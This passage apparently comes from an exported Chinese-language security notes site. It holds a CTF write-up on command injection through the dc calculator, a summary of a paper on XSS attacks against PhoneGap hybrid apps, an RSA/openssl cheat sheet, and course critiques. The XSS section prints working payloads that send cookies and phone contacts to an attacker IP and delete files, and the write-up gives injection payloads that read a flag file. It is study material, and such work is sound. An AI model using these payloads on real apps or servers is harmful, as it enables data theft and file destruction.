\u0026#39; \u0026#39; in script_file or \u0026#39;flag\u0026#39; in script_file: return \u0026#39;:(\u0026#39; proc = subprocess.run( [\u0026#39;dc\u0026#39;, script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template(\u0026#39;index.html\u0026#39;, output=output) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) :::\nRecon # 這一題看了一下source code，發現他只是用了sequence參數抓取.dc檔案，然後用subprocess另外執行，所以dc到底是一個甚麼樣的指令?看了其他網站12，發現它就只是一個calculator，然後他支援自己寫的腳本，所以他就是抓sequence這個get參數，然後做簡單的輸入字串驗證(不能有flag和空格)，所以可以想一下能不能用command injection的手法達到RCE，具體來說還是看了CTFTime上的WP3才知道可以用!接shell command，實際測試如下:\n$ dc -e \\!ls factorial.dc fibonacchi.dc flag.txt main.py power.dc templates $ python \u0026gt;\u0026gt;\u0026gt; import subprocess \u0026gt;\u0026gt;\u0026gt; subprocess.run([\u0026#39;dc\u0026#39;, \u0026#34;-e !ls Web/sequence_gallery/dist/src\u0026#34;]) factorial.dc fibonacchi.dc flag.txt main.py power.dc templates CompletedProcess(args=[\u0026#39;dc\u0026#39;, \u0026#39;-e !ls Web/sequence_gallery/dist/src\u0026#39;], returncode=0) 兩者的區別是一般的shell需要特別用反斜線在驚嘆號前而在python的interactive mode不需要，所以我們就以python的環境來生成payload :::warning 用一般的command injection做不出來，我試過`和$但都沒用，因為它是用subprocess去接所以格式不同，不然一般的shell是可以處理這些東西 :::\n\u0026gt;\u0026gt;\u0026gt; subprocess.run([\u0026#39;dc\u0026#39;, \u0026#34;`id`\u0026#34;]) dc: Could not open file `id` CompletedProcess(args=[\u0026#39;dc\u0026#39;, \u0026#39;`id`\u0026#39;], returncode=0) \u0026gt;\u0026gt;\u0026gt; subprocess.run([\u0026#39;dc\u0026#39;, \u0026#39;\u0026#34;$(id)\u0026#34;\u0026#39;]) dc: Could not open file \u0026#34;$(id)\u0026#34; CompletedProcess(args=[\u0026#39;dc\u0026#39;, \u0026#39;\u0026#34;$(id)\u0026#34;\u0026#39;], returncode=0) Exploit - Command Injection # 先測試一般的id能不能顯示 Payload: -e !id $\\to$ Wrong(不能有空格) Payloda: -e%60!id $\\to$ Did not show(這邊試了很久，發現是我們的指令沒有一個換行) Payload: -e%60!id%0a $\\to$ Correct(所以其實中間的dummy string可以隨便設定以取代空格但一定要有換行)\n所以就可以用其他payload讀flag\n/?sequence=-e`!ls%0A factorial.dc fibonacchi.dc flag.txt main.py power.dc templates \u0026#39;`\u0026#39; (0140) unimplemented /?sequence=-e`!cat$IFS*.txt%0A crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx} \u0026#39;`\u0026#39; (0140) unimplemented :::info 最後一個payload必須要是使用$IFS搭配*.txt，不能$IFSf*.txt，這樣會失敗，我想可能是因為字串之間會有衝突吧 ::: Flag: crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}\nTrick 用dc command執行10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx會顯示DouULikeDC的字樣，算是作者的小趣味\nReference # dc command in Linux with examples\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nLinux dc命令\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCTFTime WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":50,"href":"/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/","title":"Cross-site Scripting Attacks on Android Hybrid Applications","section":"Survey Papers","content":" Cross-site Scripting Attacks on Android Hybrid Applications # :::info Bao, W., Yao, W., Zong, M., \u0026amp; Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::\n這一篇論文雖然很舊了，但還是蠻有趣的\nIntroduction # 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣\nGartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background # What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method # How XSS attack success on PhoneGap\u0026rsquo;s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。\n另外一種則是直接嵌入有問題的code在網頁中，等到使用者瀏覽這個網頁的時候就會被PhoneGap的WebView所Render，達成和上面一樣的效果，類似傳統的攻擊，受害範圍則是cookies, session hijacking, location leaking\u0026hellip;，用的function是document.cookie, write(), appendChilld(), script tag Experiment # 作者提到，為了分析一些可能受到XSS攻擊的應用場景，這些 App都是使用PhoneGap框架開發的混合 App。 由於Google Play提供的大部分PhoneGap App要麼沒有使用某些存在漏洞的PhoneGap插件，要麼不顯示攻擊效果，因此很難使用真實的 App進行演示。 因此，他們demo了對他們自己的PhoneGap App的攻擊\nCookie Stealing and Session Hijacking # 作者把malicious code插在簡單的comment management system中，這個App是PhoneGap Framework做的，而且有storage XSS漏洞。如果這個 App是基於native language的，那麼JavaScript code將永遠不會被執行。 但是，在此 PhoneGap App中，如果 App使用任何易受攻擊的 API 來顯示評論，則程式碼將在 WebView 內執行。 左邊的圖片: \u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; 網頁沒有任何異常情況下，作者只使用\u0026quot;append()\u0026quot; API為網頁新增註解。 透過JQuery API顯示評論字段，然後同時觸發注入的程式碼。 顯然，\u0026ldquo;append()\u0026rdquo; API 並不安全。 \u0026ldquo;innerHTML\u0026rdquo; API 比\u0026quot;append()\u0026ldquo;更安全，並且不會運行\u0026quot;script\u0026quot;標籤內的程式碼，因此作者可以使用\u0026quot;innerHTML\u0026rdquo; API 來替換。 中間的圖片: 這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功 右邊的圖片: \u0026lt;img src=x onerror= \u0026#34;alert(document.cookie )\u0026#34;\u0026gt; 但我們還是可以改變payload，讓攻擊可以成功，也就是用上述提到的第二列payload，結果就會如最右邊的截圖 當然我們也可以嘗試把得到的敏感資訊透過第三個payload傳出去給attacker，得到的response如下\n\u0026lt;img src=x onerror= \u0026#34;new Image().src=\u0026#39;http://10.103.30.97:80/cookies/attacker.php?cookie=\u0026#39;%2bdocument.cookie\u0026#34;\u0026gt; Attacker\u0026rsquo;s Server Receive:\nhttp://10.103.30.97/cookies/manage.php?name=Admin\u0026amp;token=e3afed0047b08059d0fada10f400c1e5 Steal Contact Data # 這次攻擊的標的是QRcode，我們可以把惡意的code嵌入在QRcode當中，如果有利用PhoneGap的App掃描到這個QRcode，因為他是在WebView中進行render，所以這個malicious code會被triggered，這個App使用的是phonegap-plugin-barcodescanner這個plugin，當程式碼顯示時，img的onerror事件將會被觸發，然後使用者的聯絡資料將會傳送給攻擊者。\nAttack Pattern \u0026lt;img src=x onerror= \u0026#34;navigator.contacts.find([\u0026#39;displayName\u0026#39;,\u0026#39;phoneNumbers\u0026#39;], function(c){ r=\u0026#39;\u0026#39;; for(i=0;c[i];i++){ if(c[i].phoneNumbers\u0026amp;\u0026amp;c[i].phoneNumbers.length){ r+=c[i].displayName+c[i].phoneNumbers[0].value+\u0026#39;\\n\u0026#39;; }} alert(r); new Image().src=\u0026#39;http://10.103.30.97/c.php?d=\u0026#39;+r; })\u0026#34; \u0026gt; 如果是用Native Language寫的App就會如左邊的圖片那樣只有顯示這個QRcode儲存的資訊，但如果是用PhoneGap寫的App，經過WebView render出來的結果，就會顯示手機的聯絡人資訊。他是用navigator.contacts.find這個API去呼叫PhoneGap的聯絡人plugin的Java code來搜尋使用者的聯絡人 Delete Files # 這一次換成利用藍牙這個標的達成攻擊，原文提到:\n一般來說，如果一個應用程式具有藍牙傳輸功能，它必須能夠讀取和寫入用戶行動裝置上的文件\n為了demo攻擊的效果，作者使用cordova-plugin-bluetooth-serial插件和cordova-plugin-file插件開發了一個PhoneGap應用程式。藍牙裝置的名稱是透過innerHTMLAPI顯示的，安全性不夠，攻擊者可以將藍牙裝置的名稱更改為惡意程式碼來實現攻擊。 並且與前兩種設計類似的是再次使用了onerror事件。\nAttack Pattern \u0026lt;img src=x onerror= \u0026#34;window.requestFileSystem(LocalFileSystem.PERSISTENT,0 ,function(f){ f.root.getDirectory(\u0026#39;ID_5\u0026#39;,null, function (e){ e.removeRecursively( function(){ alert(\u0026#39;Delete ID_5 Success!\u0026#39;) },null); },null); },null);\u0026#34;\u0026gt; 同樣的如果用native app進行連線，就不會遇到攻擊的問題(如左圖)，但如果是用右圖的PhoneGap設計的App，window.requestFileSystem()要求系統存取根檔案系統並傳回一個對象，該物件儲存在FileSystem變數f中。 它的 root 屬性包含一個DirectoryEntry對象，表示目前檔案系統的根目錄。 所以我們使用f.root.getDirectory()來搜尋根目錄中的ID_5目錄。 當找到目錄時，將回傳值儲存在DirectEntry物件e中，並呼叫第5行至第9行中的回呼函數。 然後ID_5目錄的DirectEntry物件呼叫其名為removeRecurively()的方法來刪除ID_5中的所有檔案。 第8行，右圖顯示指定目錄刪除成功的通知。 "},{"id":51,"href":"/tools/ctf/crypto-cheat-sheet/","title":"Crypto Cheat Sheet","section":"Tools","content":" Crypto Cheat Sheet # Online Tools - Classic Crypto # Complex Substitution Cipher Vigenère Cipher CyberChef Substitution Cipher Solver Tool Known Key Python - pycipher libraryonline - Vigenère cipherCAP4 quipqiup Unknown KeyVigenère Cipher CodebreakerVigenere Solver RSA相關攻擊 # 其實整裡的文章內容都差不多\n【技術分享】CTF中RSA的常見攻擊方法 Mod相關攻擊 CTF RSA Coding Tools # 大數運算: gmpy2/sage math online - cocalc/sage math online - sagecell/WolframAlpha:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看這裡 $ sudo apt install sagemath # or $ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl --- # 想要在sage中安裝python library $ sage -pip install {library name} :::spoiler To address Discrete Log Problem p = 117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283 q = 163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599 c = 0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8 g = Mod(3,p) m = discrete_log(c,g) print(hex(m)) g2 = Mod(3,q) m2 = discrete_log(c,g2) print(m2) print(hex(m2)[2:]) ::: Crypto常用library: pycryptodom $ pip install pycryptodome :::spoiler pycryptodome generate PEM file \u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; n = 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed \u0026gt;\u0026gt;\u0026gt; e = 0x10001 \u0026gt;\u0026gt;\u0026gt; d = 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61 \u0026gt;\u0026gt;\u0026gt; p = 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15 \u0026gt;\u0026gt;\u0026gt; q = 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79 \u0026gt;\u0026gt;\u0026gt; key_params = (n, e, d, p, q) \u0026gt;\u0026gt;\u0026gt; key = RSA.construct(key_params) \u0026gt;\u0026gt;\u0026gt; f = open(\u0026#39;./rsaprivatekey.pem\u0026#39;, \u0026#39;w\u0026#39;) \u0026gt;\u0026gt;\u0026gt; f.write(key.exportKey().decode()) \u0026gt;\u0026gt;\u0026gt; f.close() ::: openssl - RSA(很清楚) :::spoiler Cheat Sheet \u0026#39;\u0026#39;\u0026#39;AES / DES\u0026#39;\u0026#39;\u0026#39; $ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt) $ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt) $ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt) $ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt) \u0026#39;\u0026#39;\u0026#39;RSA\u0026#39;\u0026#39;\u0026#39; $ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024 # (generate RSA private key) $ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out rsa_publickey.pem (generate RSA public key) $ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt # (use public key to encrpt) $ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt # To print out the components of a private key to standard output $ openssl rsa -in key.pem -text -noout # 把certificate轉成pem file $ openssl openssl x509 -in cert -pubkey -noout -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- # 把單純public key的內容(n, e)(就是上面的東西)印出來 $ openssl rsa -pubin -in public.pem -text RSA Public-Key: (53 bit) Modulus: 4966306421059967 (0x11a4d45212b17f) Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- // 產出私鑰 openssl genrsa -out key.pem 2048 // 用同一把私鑰，產出兩組不同的憑證 openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30 openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30 // 顯示公鑰是一樣 openssl x509 -pubkey -noout -in cert1.pem openssl x509 -pubkey -noout -in cert2.pem // 顯示憑證內容是不一樣 openssl x509 -inform pem -in cert2.pem openssl x509 -inform pem -in cert1.pem ::: Factoring Tools # Factor DB Yafu Prime Factorization Online "},{"id":52,"href":"/security/course/ntu-cns/cryptography-and-network-security---final-project/","title":"Cryptography and Network Security - Final Project","section":"Securities","content":" Cryptography and Network Security - Final Project # Threshold HE Description # With a designed scheme in place for threshold homomorphic encryption, private keys are divided into various shares among participating individuals who then work together to collaborate on computations without revealing plaintext material.\nDecryption requires collaboration from at least the minimum requirement, e.g. $(t,n)$ means there\u0026rsquo;re $n$ participate parties but need at least $t$ parties\u0026rsquo; granting to decrypt the secret just like secret sharing scheme proposed by Shamir. Threshold homomorphic\u0026rsquo;s primary objective is secure computation involving confidential information with lesser exposure or accessibility risks for single individuals - due to a shared understanding by several stakeholders.\nThis approach can prevent possible failures or compromise issues quickly becoming apparent within an organization.\nThreshold homomorphic encryption has various applications, particularly in secure multi-party computation scenarios. It enables collaborative data analysis and computations while maintaining privacy. Additionally, it can be used to securely process sensitive data in the cloud, where the data remains encrypted throughout the computation, minimizing the exposure of private information.\nIt\u0026rsquo;s important to note that while threshold homomorphic encryption offers increased security and privacy, it can also introduce additional complexity and overhead compared to traditional homomorphic encryption schemes. The distribution of shares, coordination among parties, and the threshold determination are some of the challenges that need to be addressed when implementing threshold homomorphic encryption.\nMoreover, they proposed (t, n)-threshold FHE is decentralized if all the parties have the same level of information and play the same role in the KeyGen and Dec protocols.\nPros \u0026amp; Cons # Pros # Decentralized: This paper also proposed a scheme that can achieve decentralized property can improve the security of a system. Moreover, decentralized systems are more reliable, resilient and enhanced transparency as well.\nSecurity: Threshold homomorphic encryption provides a higher level of security and privacy compared to traditional homomorphic encryption schemes. By distributing the encryption key across multiple parties, it performs computations on encrypted data without revealing the underlying data itself, and also reduces the risk of a single point of failure or compromise. This makes it more resistant to attacks and enhances overall security and can enables secure collaboration on sensitive information without exposing it to all parties involved.\nDistributed computation: With threshold homomorphic encryption, computations can be distributed among multiple parties. Each party can perform part of the computation on their own encrypted data, and the results can be combined without the need to decrypt the data. This allows for efficient parallel processing and enables secure multi-party computations.\nFlexibility: Threshold homomorphic encryption supports a wide range of operations, including addition, multiplication, and more complex computations like sorting and searching. This flexibility makes it suitable for various applications that require privacy-preserving computations.\nCons # Complexity: Implementing threshold homomorphic encryption is more complex than traditional homomorphic encryption schemes. It requires careful coordination and secure communication among the participating parties. The additional complexity can make the implementation more challenging and may require specialized knowledge.\nKey management: Threshold homomorphic encryption requires secure key management, as the encryption key is distributed among multiple parties. Ensuring the secure generation, storage, and distribution of the key shares can be challenging and requires robust protocols and mechanisms to maintain security.\nLimited functionality: While threshold homomorphic encryption supports a wide range of operations, there are still some limitations compared to fully homomorphic encryption (FHE). Certain operations, such as division or non-polynomial functions, may not be directly supported by threshold homomorphic encryption schemes.\n"},{"id":53,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/","title":"Cryptography and Network Security - Regular Critique 2","section":"Securities","content":" Cryptography and Network Security - Regular Critique 2 # Reading Topic: A key-management scheme for distributed sensor networks # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nSummary # Distributed Sensor Networks (DSNs) are quite different from traditional embedded system networks, such as the number of nodes. Therefore, the security of the communication between each node is crucial. However, the storage capacity and computation capability of each node is the shallow level which is not enough to handle. So, we can’t use high computing power techniques such as asymmetric cipher (RSA) to deal with it. In contrast, they decided to use a symmetric cipher system to implement it and focus the point on how to manage and keep the key safe. This paper aimed to address the number of keys that each node in DSNs has too much. For example, if the number of nodes in DSN is n, then each node has to keep n-1 shared keys for connecting. This is not a good plan to implement. Overall, they proposed a brand-new key management scheme for large-scale DSNs and attempt to find the balance between safety and efficiency. In addition, according to the simulation result, they found out the comparison is highly better than the traditional key pre-distribution scheme.\nStrength(s) of the paper # This paper is based on the random graph method to pre-distribute the necessary keys when initializing the settings so that it can solve the disadvantage that the number of keys increases almost quadratically with the number of nodes Even if two nodes cannot use a shared key to achieve the purpose of exchanging information or communication, as long as there is a path that connects to other nodes, then the shared key can also be exchanged The other advantage is scalable and flexibility: trade-offs can be made between sensor-memory cost and connectivity, and design parameters can be adapted to fit the operational requirements of a particular environment. Weakness(es) of the paper # They only show that the current number of nodes is 10,000 or 100,000. But how about 10 million or more? In nowadays cases, more keys need to be stored, because it is impossible to achieve 100% coverage by only accessing 250 necessary keys forever. Even if they can use only 250 keys to cover all the nodes, the more time spent exchanging the key, the higher chance of being stolen.\nYour own reflection # Maybe they can use the Elliptic Curve Cryptography method implemented in the blockchain system to deal with the problem between transmissions because the number of keys is very small and the operation speed is very fast, but if you use the symmetric key cipher mentioned in the article, you still have to push back to how to establish secure communication to achieve the purpose of sharing key. And this isn’t mentioned in the article, therefore, I suggest using some Diffie-Hellman-based method or using other state-of-the-art techniques refer to as block-chain.\nReference # 隨機圖筆記1-兩種基本模型\n"},{"id":54,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/","title":"Cryptography and Network Security – Comparative Critique 1","section":"Securities","content":" Cryptography and Network Security – Comparative Critique 1 # Reading Topic: Reflections on trusting distributed trust # Reading Topic: Reflections on Trusting Trust # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\n:::spoiler Background 什麼是 Intel® SGX？\n提供以硬體為基礎的記憶體加密功能，可在記憶體內隔離特定的應用程式碼與資料。Intel® SGX 允許將使用者層級的程式碼配置於記憶體中的隱私區域，這稱為「指定位址空間」(enclave)，其設計是為了在較高權限層級的執行程序中受到保護\nWhat is firefox Telemetry\n這個功能對 Mozilla 工程師來說很有幫助，它可以幫助工程師了解 Firefox 實際的運作狀況。Telemetry 會傳送使用量及體驗的資訊給 Mozilla。當您使用 Firefox 時，Telemetry 就會測量與收集與個人隱私無關的資訊，例如記憶體消耗、反應時間和各種功能的使用頻率。這些資訊會每天例行傳送給 Mozilla 利用，讓 Firefox 越來越完善。\nLet\u0026rsquo;s Encrypt \u0026amp; ISRG\nLet\u0026rsquo;s Encrypt 是免費、自動化和開放的憑證頒發機構，由非營利組織網路安全研究小組 (Internet Security Research Group, ISRG) 營運。\nWhat is IETF\n網際網路工程任務組（Internet Engineering Task Force，IETF） 成立於1986年，主要任務為負責網路技術規範的研究和標準的制定。 其屬於開放性組織，任何人都可參與，參加對象多以個人為主而非代表公司或團體。\nWhat is HSM(Hardware Security Module)\n硬體安全模組 (Hardware Security Module)。 提供隨需應變加密、金鑰管理及金鑰儲存空間作為受管理服務。 HSM 是實體應用裝置，可處理加密法處理的資源密集型作業，並減少應用程式的延遲時間。\n:::\nSummary of Reflections on Trusting Trust # It attempts to convey the concept that there are vulnerabilities in the compiler that are not easy to find. The main concept is if the compiler itself is tampered with maliciously, then the whole system will become vulnerable. In this paper, the author tried to demo how his perspective and actual attack concept. In addition, this kind of attack is untraceable, which means it\u0026rsquo;s hard to defend. The conclusion is before we trust the computing system, we must take compiler security seriously and try to find an algorithm or method to detect if the compiler is tampered with or not.\nSummary of Reflections on trusting distributed trust # Nowadays, the authors have seen an explosion of academic and industrial cryptographic systems built on distributed trust, including secure multi-party computation applications and blockchains. These systems have great potential for improving security and privacy, but face a significant hurdle on the path to deployment. This paper attempt to establish a system that easy to set up a distributed-trust application without expensive, cross-organization coordination. For now, bootstrapping without cross-organization coordination can enable small organizations to securely deploy distributed-trust systems such as end-to-end encrypted messaging applications that could use the distributed trust to establish a public-key infrastructure or backup secret keys.\nComparison between them # In \u0026ldquo;Reflections on Trusting Trust\u0026rdquo;, talked about the computing system security in compiler exploitation with uneasy to detect property. And the other one talked about how to construct a trusting system nowadays in which the global system connects together and how to deploy the system easily. So, though they talked about \u0026ldquo;trusting\u0026rdquo;, the previous one focused on attacking and detecting potential crises, and the other one focused on establishing trust and maintaining it within the distributed system.\nThe solution of these two papers first proposed a solution that the compiler should add some protection to the source code to prevent the injection of malicious code. The other one proposed a method such as distributed hash value to establish a trusting connection and use it to check the code that runs in the trust domain.\nReflection # As I mentioned above, these papers proposed a few perspectives on different system articles. They used a different way to prove how important the problem is, and also proposed some concept or an actual way to address it. If I were the author of the first paper, I\u0026rsquo;ll attempt to use some program analysis or runtime monitoring, to detect and prevent such attacks automatically. In addition, I\u0026rsquo;ll extend the trusting trust concept to hardware attacks such as microprocessors or firmware backdoors, etc. In the second paper, I\u0026rsquo;ll try to extend the distributed system trusting issue to blockchain technology which may have some vulnerabilities that can solve by the concept of this paper. Another issue that I\u0026rsquo;d like to discuss is the trade-off of security and effective in the easy-deploy system that this paper proposed. Is there a way to achieve these properties simultaneously?\n"},{"id":55,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/","title":"Cryptography and Network Security – Comparative Critique 2","section":"Securities","content":" Cryptography and Network Security – Comparative Critique 2 # Reading Topic: The Password Reset MitM Attack # Reading Topic: Is Real-time Phishing Eliminated with FIDO? Social Engineering Downgrade Attacks against FIDO Protocols # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nBackground # Downgrade Attack FIDO 是什麼？ Topic 1 Translation\nSummary of paper 1 # The Password Reset MitM Attack\u0026quot; paper aims to address a security vulnerability in the password reset process that allows attackers to intercept a victim\u0026rsquo;s password reset link and gain access to their account. This problem matters because attackers can compromise personal information and sensitive data. The paper presents the Password Reset Man-in-the-Middle (PRMitM) attack and proposes several defenses to mitigate the risk, including challenge-response protocols and additional authentication factors. The authors conclude that PRMitM attacks are a significant threat to online account security, and suggest implementing additional security measures and informing users of the risks to strengthen the security of their accounts.\nSummary of paper 2 # The paper addresses the problem of social engineering downgrade attacks against FIDO authentication protocols, which can bypass its strong authentication measures and lead to phishing attacks. Phishing attacks are a significant cybersecurity threat, and FIDO was developed to provide stronger authentication methods. The researchers analyzed the FIDO protocols and conducted experiments to demonstrate the effectiveness of social engineering downgrade attacks against FIDO. The study concludes that social engineering downgrade attacks can bypass FIDO\u0026rsquo;s authentication measures and launch phishing attacks.\nComparison between them # \u0026ldquo;Is Real-time Phishing Eliminated with FIDO?\u0026rdquo; paper identifies and analyzes a previously unknown vulnerability in the FIDO authentication protocol: social engineering downgrade attacks. In addition, the others identify a vulnerability in the password reset process, where an attacker can intercept and modify the reset process to gain access to an account. And I think the paper\u0026rsquo;s (The Password Reset MitM Attack) threat model is quite easier to achieve for attackers due to its trivial process and low cost of deploying a website that seduces some users to provide their sensitive information for free resources. They have very similar threat models and attack methods in different domains. They both discussed men-in-the-middle attacks with different platforms, such as 